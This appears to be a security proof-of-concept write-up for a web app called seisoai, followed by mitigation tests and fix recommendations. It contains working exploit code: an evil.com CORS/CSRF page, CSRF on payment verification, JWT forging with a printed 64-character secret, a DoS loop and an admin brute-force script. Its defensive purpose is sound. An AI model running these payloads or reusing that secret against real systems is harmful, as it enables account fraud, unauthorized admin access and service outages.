# Security Exploits - Proof of Concept

⚠️ **WARNING: These exploits are for educational and security testing purposes only. Do not use against systems you don't own or have explicit permission to test.**

This document demonstrates how the identified vulnerabilities could be exploited.

---

## Exploit 1: Admin Secret Exposure via Request Body

**Vulnerability:** Admin secret accepted in request body (logged/exposed)

**Proof of Concept:**
```bash
# Admin secret could be logged by proxies, load balancers, or application logs
curl -X POST https://your-api.com/api/admin/add-credits \
  -H "Content-Type: application/json" \
  -d '{
    "adminSecret": "30df28efd892d65081b26652cedb7a26dcfa6d3e79067e2c0fff8a5977458f00",
    "userId": "victim-user-id",
    "credits": 10000
  }'

# This request body could appear in:
# - Application logs
# - Reverse proxy logs (nginx, cloudflare)
# - Load balancer logs (AWS ALB, etc.)
# - Browser developer tools
# - Network packet captures
```

**Impact:** Admin secret exposed → Full system compromise

---

## Exploit 2: CORS Bypass Attack

**Vulnerability:** Permissive CORS allows any origin

**Proof of Concept:**
```html
<!-- Malicious website: evil.com -->
<!DOCTYPE html>
<html>
<head>
  <title>Free Credits!</title>
</head>
<body>
  <h1>Click here for free credits!</h1>
  <script>
    // If user is logged into seisoai.com, this will work
    fetch('https://seisoai.com/api/admin/add-credits', {
      method: 'POST',
      credentials: 'include', // Sends cookies
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token') // If token stored
      },
      body: JSON.stringify({
        userId: 'attacker-controlled-id',
        credits: 1000000
      })
    })
    .then(r => r.json())
    .then(data => {
      // Credits added to attacker's account
      console.log('Exploited!', data);
    });
  </script>
</body>
</html>
```

**Impact:** Any website can make authenticated requests → CSRF attacks, data theft

---

## Exploit 3: Token Blacklist Bypass After Restart

**Vulnerability:** Token blacklist is in-memory only

**Proof of Concept:**
```javascript
// 1. User logs in, gets token
const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";

// 2. User logs out (token blacklisted)
fetch('https://api.com/api/auth/logout', {
  method: 'POST',
  headers: { 'Authorization': `Bearer ${token}` }
});

// 3. Server restarts (deployment, crash, etc.)
// Token blacklist is cleared from memory

// 4. Attacker can use the "revoked" token again
fetch('https://api.com/api/auth/me', {
  headers: { 'Authorization': `Bearer ${token}` }
});
// ✅ Works! Token is valid again
```

**Impact:** Compromised tokens can't be permanently revoked

---

## Exploit 4: CSRF Attack on Payment Verification

**Vulnerability:** No CSRF protection on state-changing endpoints

**Proof of Concept:**
```html
<!-- Malicious website -->
<form id="csrf-form" action="https://seisoai.com/api/stripe/verify-payment" method="POST">
  <input type="hidden" name="paymentIntentId" value="pi_attacker_controlled">
  <input type="hidden" name="userId" value="attacker_user_id">
</form>

<script>
  // If user is logged in, this form submission will work
  // Browser automatically sends cookies/Authorization header
  document.getElementById('csrf-form').submit();
  
  // Or using fetch with credentials
  fetch('https://seisoai.com/api/stripe/verify-payment', {
    method: 'POST',
    credentials: 'include', // Sends cookies
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      paymentIntentId: 'pi_fake',
      userId: 'attacker_id',
      credits: 10000
    })
  });
</script>
```

**Impact:** Attacker can trigger actions on behalf of authenticated users

---

## Exploit 5: Secrets from Repository

**Vulnerability:** Secrets committed to version control

**Proof of Concept:**
```bash
# If repository is public or compromised:
git clone https://github.com/user/seisoai.git
cat backend.env

# Attacker now has:
# - JWT_SECRET → Can generate valid tokens for any user
# - ADMIN_SECRET → Full admin access
# - ENCRYPTION_KEY → Can decrypt all encrypted data
# - SESSION_SECRET → Can forge sessions

# Generate admin token:
node -e "
const jwt = require('jsonwebtoken');
const secret = '30df28efd892d65081b26652cedb7a26dcfa6d3e79067e2c0fff8a5977458f00';
const token = jwt.sign({ admin: true, userId: 'any-user' }, secret);
console.log('Admin token:', token);
"

# Use admin token:
curl -X POST https://api.com/api/admin/add-credits \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"userId": "any-user", "credits": 999999}'
```

**Impact:** Complete system compromise

---

## Exploit 6: DoS via Large Request Body

**Vulnerability:** 150MB request limit on audio routes

**Proof of Concept:**
```javascript
// Create a 150MB payload
const largePayload = 'A'.repeat(150 * 1024 * 1024); // 150MB of 'A'

// Send multiple requests simultaneously
for (let i = 0; i < 10; i++) {
  fetch('https://api.com/api/audio/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ data: largePayload })
  });
}

// Server memory exhausted → DoS
```

**Impact:** Server resource exhaustion → Denial of Service

---

## Exploit 7: Brute Force Admin Secret

**Vulnerability:** Admin rate limiting allows 10 attempts per 15 minutes

**Proof of Concept:**
```python
import requests
import time
import itertools
import string

# Common admin secrets to try
common_secrets = [
    "admin123",
    "password",
    "secret",
    "admin",
    # ... plus the actual secret if leaked
]

base_url = "https://api.com/api/admin/add-credits"

# Try 10 attempts per 15 minutes
# With distributed IPs, could try thousands of combinations
for secret in common_secrets:
    response = requests.post(
        base_url,
        headers={"Authorization": f"Bearer {secret}"},
        json={"userId": "test", "credits": 1},
        timeout=5
    )
    
    if response.status_code == 200:
        print(f"✅ Found admin secret: {secret}")
        break
    
    time.sleep(90)  # Wait between attempts to avoid rate limit
```

**Impact:** Admin access gained through brute force

---

## Exploit 8: Refresh Token Not Blacklisted

**Vulnerability:** Refresh tokens not checked against blacklist

**Proof of Concept:**
```javascript
// 1. User logs in, gets refresh token
const refreshToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";

// 2. User logs out (access token blacklisted, but refresh token not checked)
fetch('https://api.com/api/auth/logout', {
  method: 'POST',
  headers: { 'Authorization': `Bearer ${accessToken}` },
  body: JSON.stringify({ refreshToken })
});

// 3. Attacker uses refresh token to get new access token
fetch('https://api.com/api/auth/refresh', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ refreshToken })
})
.then(r => r.json())
.then(data => {
  // ✅ New access token issued even though refresh token was "revoked"
  console.log('New token:', data.token);
});
```

**Impact:** Logged-out users can still refresh tokens

---

## Mitigation Testing

To verify these exploits are fixed, test:

```bash
# Test 1: Admin secret in body should fail
curl -X POST http://localhost:3001/api/admin/add-credits \
  -H "Content-Type: application/json" \
  -d '{"adminSecret": "test", "userId": "test", "credits": 1}'
# Should return 403, not 200

# Test 2: CORS from unauthorized origin should fail
curl -X GET http://localhost:3001/api/auth/me \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer valid-token" \
  -v
# Should not have Access-Control-Allow-Origin: https://evil.com

# Test 3: CSRF token should be required
curl -X POST http://localhost:3001/api/stripe/verify-payment \
  -H "Content-Type: application/json" \
  -d '{"paymentIntentId": "test"}'
# Should require CSRF token

# Test 4: Token blacklist should persist
# Logout, restart server, try to use token → should fail
```

---

## Recommendations

1. **Never commit secrets** - Use environment variables
2. **Restrict CORS** - Only allow trusted origins
3. **Header-only auth** - Never accept secrets in body
4. **Persistent blacklist** - Use Redis/database
5. **CSRF tokens** - Required for all state changes
6. **Rate limiting** - Stricter on sensitive endpoints
7. **Request limits** - Reasonable size limits
8. **Account lockout** - After failed attempts

---

**Remember:** These are real vulnerabilities that need to be fixed before production deployment!
